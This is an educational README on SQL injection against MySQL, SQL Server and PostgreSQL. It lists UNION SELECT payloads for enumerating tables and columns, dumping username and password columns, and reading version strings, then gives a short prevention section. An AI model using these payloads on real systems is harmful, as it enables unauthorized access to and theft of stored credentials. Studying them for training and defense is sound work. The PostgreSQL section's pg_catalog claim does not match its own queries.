# SQL Injection Attack - Listing Database Contents on Non-Oracle Databases

This README provides a comprehensive guide on performing **SQL injection attacks** to list database contents (e.g., tables, columns, and data) on **non-Oracle databases** such as **MySQL**, **SQL Server**, and **PostgreSQL**. The guide also covers techniques for retrieving database version information and includes preventive measures against these attacks.

---

## Table of Contents
1. [Introduction](#introduction)
2. [SQL Injection in MySQL](#sql-injection-in-mysql)
   - [Listing Tables](#listing-tables)
   - [Listing Columns in a Table](#listing-columns-in-a-table)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table)
   - [Retrieve Database Version](#retrieve-database-version)
3. [SQL Injection in SQL Server](#sql-injection-in-sql-server)
   - [Listing Tables](#listing-tables-1)
   - [Listing Columns in a Table](#listing-columns-in-a-table-1)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table-1)
   - [Retrieve Database Version](#retrieve-database-version-1)
4. [SQL Injection in PostgreSQL](#sql-injection-in-postgresql)
   - [Listing Tables](#listing-tables-2)
   - [Listing Columns in a Table](#listing-columns-in-a-table-2)
   - [Retrieving Data from a Table](#retrieving-data-from-a-table-2)
   - [Retrieve Database Version](#retrieve-database-version-2)
5. [General SQL Injection Steps](#general-sql-injection-steps)
6. [Prevention](#prevention)

---

## Introduction

SQL Injection (SQLi) is a critical security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code into user inputs. This guide will explore common SQL injection methods used to retrieve database information like tables, columns, and data from **non-Oracle** databases, including **MySQL**, **SQL Server**, and **PostgreSQL**. It will also explain how to list the database version using these methods and how to protect against SQL injection attacks.

---

## SQL Injection in MySQL

MySQL databases store metadata in the **`information_schema`** database. You can exploit SQL injection vulnerabilities to list database tables, columns, and retrieve sensitive data.

| **Action**                    | **SQL Injection Query**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------------|
| **Listing Tables**             | `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --`  |
| **Listing Columns in a Table** | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --` |
| **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                        |
| **Retrieve Database Version**  | `' UNION SELECT version(), NULL --`                                                      |

---

## SQL Injection in SQL Server

SQL Server uses system views like **`sys.tables`** and **`sys.columns`** to store metadata. You can inject SQL queries to access this data.

| **Action**                    | **SQL Injection Query**                                                                  |
|-------------------------------|------------------------------------------------------------------------------------------|
| **Listing Tables**             | `' UNION SELECT name, NULL FROM sys.tables --`                                            |
| **Listing Columns in a Table** | `' UNION SELECT name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users') --`      |
| **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                         |
| **Retrieve Database Version**  | `' UNION SELECT @@VERSION, NULL --`                                                       |

---

## SQL Injection in PostgreSQL

PostgreSQL stores its metadata in the **`pg_catalog`** schema. You can query this schema using SQL injection.

| **Action**                    | **SQL Injection Query**                                                                  |
|-------------------------------|------------------------------------------------------------------------------------------|
| **Listing Tables**             | `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --` |
| **Listing Columns in a Table** | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --` |
| **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                          |
| **Retrieve Database Version**  | `' UNION SELECT version(), NULL --`                                                        |

---

## General SQL Injection Steps

Follow these general steps when performing SQL injection:

1. **Identify the Database Type**:
   - Use error-based techniques or SQL version retrieval commands like `@@VERSION` (SQL Server) or `VERSION()` (MySQL) to identify the database type.

2. **Determine the Number of Columns**:
   - Use `ORDER BY` clauses or error messages to determine the number of columns in the original query.
     - Example: `' ORDER BY 1 --`, `' ORDER BY 2 --`, etc.

3. **Use `UNION SELECT` to Retrieve Metadata**:
   - List all tables: 
     ```sql
     ' UNION SELECT table_name, NULL FROM information_schema.tables
     ```
   - List columns for a specific table:
     ```sql
     ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'
     ```

4. **Retrieve Sensitive Data**:
   - Example: Retrieve data from the `users` table:
     ```sql
     ' UNION SELECT username, password FROM users --
     ```

---

## Prevention

SQL Injection attacks can be mitigated using several strategies:

### 1. **Use Parameterized Queries / Prepared Statements**
   - Ensure that user input is treated as data, not part of the SQL query, preventing SQL injection attacks.

### 2. **Input Validation**
   - Validate user input to ensure it meets expected formats. Reject inputs containing special characters like `'`, `--`, or `;`.

### 3. **Principle of Least Privilege**
   - Ensure that database user accounts used by applications have only the necessary privileges, limiting their potential impact.

### 4. **Implement Web Application Firewalls (WAFs)**
   - Use WAFs to detect and block common SQL Injection attacks.

### 5. **Error Handling**
   - Avoid revealing database error messages to end-users, as they can expose sensitive information about your database structure.

---

## Conclusion

SQL Injection is a critical security vulnerability that can lead to severe data breaches. Understanding how these attacks work and applying preventive measures is essential for securing your web applications and databases.

---

### Contributors

- **Md. Khairul Islam**: Author
